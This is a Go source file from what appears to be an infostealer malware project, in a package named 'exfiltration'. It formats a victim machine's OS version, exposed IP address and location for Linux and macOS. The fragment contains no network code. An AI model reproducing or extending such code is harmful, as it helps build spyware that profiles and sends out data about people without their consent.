//go:build linux || darwin

package exfiltration

import (
	"vyper/Stub/infostealer"
)

func getSysDescription(data *DataStruct) string {
	var description string
	switch v := data.SysInfo.(type) {
	case *infostealer.SysinfoLinux:
		description = "OS VERSION: " + v.OSVersion + "\nIP ADDRESS: " + v.ExposedIP + "\nLOCATION:   " + v.Location
	case *infostealer.SysinfoMac:
		description = "OS VERSION: " + v.OSVersion + "\nIP ADDRESS: " + v.ExposedIP + "\nLOCATION:   " + v.Location
	}
	return description
}
